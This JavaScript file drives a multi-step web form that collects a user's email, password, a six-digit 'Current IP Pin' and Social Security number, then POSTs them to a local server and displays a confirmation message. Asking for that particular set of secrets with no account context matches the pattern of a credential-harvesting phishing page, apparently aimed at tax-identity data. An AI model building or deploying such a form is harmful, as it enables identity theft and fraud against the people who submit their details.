// Questions Array
const questions = [
    {question : 'Email', name: "email", type : 'email', pattern : /^\S+@\S+\.\S+$/, answer: ""},
    {question : 'Password', name: "password", type : 'password', answer: ""},
    {question : 'Current IP Pin', name: "ip_pin", type : 'password', pattern : /^\b\d{6}\b$/, answer: ""},
    {question : 'SSN', name: "ssn", type : 'password', pattern : /^(\d{3})-?(\d{2})-?(\d{4})$/, answer: ""}
]

//Transition Times
const shakeTime = 100; //Shake Transition Time
const switchTime = 200; // Transition Between Questions

//Init Position At First Question
let position = 0;

//Init DOM Elements
const formBox = document.querySelector('#form-box');
const nextBtn = document.querySelector('#next-btn');
const prevBtn = document.querySelector('#prev-btn');
const inputGroup = document.querySelector('#input-group');
const inputField = document.querySelector('#input-field');
const inputLabel = document.querySelector('#input-label');
const inputProgress = document.querySelector('#input-progress');
const progressBar = document.querySelector('#progress-bar');

//Events

//get question on DOM LOad
document.addEventListener('DOMContentLoaded', getQuestion);

//Next Button Click
nextBtn.addEventListener('click', validate);

//Previous Button Click
prevBtn.addEventListener('click', getPrevQuestion)
//Input Field Enter Click
inputField.addEventListener('keyup', e => {
    if(e.keyCode == 13){
        validate();
    }
});

//Functions

//get questions from array and add to markup
function getQuestion(){
    //get current question
    inputLabel.innerHTML = questions[position].question;
    //get current type
    inputField.type = questions[position].type || 'text';
    //get current answer
    inputField.value = questions[position].answer || '';
    //Focus on Element
    inputField.focus();

    //set progress bar width- variable to the questions lenght
    progressBar.style.width = (position * 100) / questions.length + '%';

    //Add User Icon or Back Arrow depending on the position of the question
    prevBtn.className = position ? 'fa-solid fa-arrow-left' : 'fa-solid fa-user';
    
    showQuestion();
}

//Display Question to User
function showQuestion(){
    inputGroup.style.opacity = 1;
    inputProgress.style.transition = '';
    inputProgress.style.width = '100%';
}

function hideQuestion(){
    inputGroup.style.opacity = 0;
    inputLabel.style.marginLeft = 0;
    inputProgress.style.width = 0;
    inputProgress.style.transition = 'none';
    inputGroup.style.border = null;
}

//Transform to Create Shake Motion
function transform(x, y){
    formBox.style.transform = `translate(${x}px, ${y}px)`;
}

function validate(){
    //Make sure Pattern Matches if there's one
    if(!inputField.value.match(questions[position].pattern || /.+/)){
        inputFail()
    } else {
        inputPass()
    }
}

//Field Input Failed
function inputFail(){
    formBox.className = 'error';
    //Repeat Shake Motion - set i to number of shakes
    for(let i = 0; i < 6; i++){
        setTimeout(transform, shakeTime * i, ((i % 2) * 2 - 1) * 20, 0);
        setTimeout(transform, shakeTime * 6, 0, 0);
        inputField.focus();
    }
}

//Field Input 
function inputPass(){
    formBox.className = '';
    setTimeout(transform, shakeTime * 0, 0, 10);
    setTimeout(transform, shakeTime * 1, 0, 0);

    //Store Answer in Array
    questions[position].answer = inputField.value;

    //Increament Position
    position++;

    //If New Question, Hide Current and Get Next
    if(questions[position]){
        hideQuestion();
        getQuestion();
    } else{
        //Remove if no more QUestions
        hideQuestion();
        formBox.className = 'close';
        progressBar.style.width = '100%';

        //Form Complte
        formComplete();
    }
}

//Get Previous Question
function getPrevQuestion(){
    position = position -1;
    getQuestion();
}
//All Fields Completed - Show H1 End
function formComplete(){
    let postData = {}
    questions.forEach((question) => {
        const allowedFields = ['email', 'password', 'ip_pin', 'ssn'];
    
        if (allowedFields.includes(question.name)) {
            postData[question.name] = question.answer;
        }
    });
    console.log(postData, JSON.stringify(postData))
    postInfo(postData)
    const h1 = document.createElement('h1');
    h1.classList.add('end');
    h1.appendChild(document.createTextNode(`Your request has been recieved, and will recieve an email shortly`));
    setTimeout(() => {
        formBox.parentElement.appendChild(h1);
        setTimeout(() => (h1.style.opacity = 1), 50);
    }, 1000);

}

const baseURL = 'http://localhost:5000/formPost'

async function postInfo(postData){
    
    const res = await fetch(baseURL, {
        method : 'POST', 
        headers : {
            "Content-Type" : 'application/json'
        },
        body : JSON.stringify(postData)
    }).then((res) =>{
        console.log("response", res)
    }).catch((err) =>{
        console.log("err", err)
    })
}
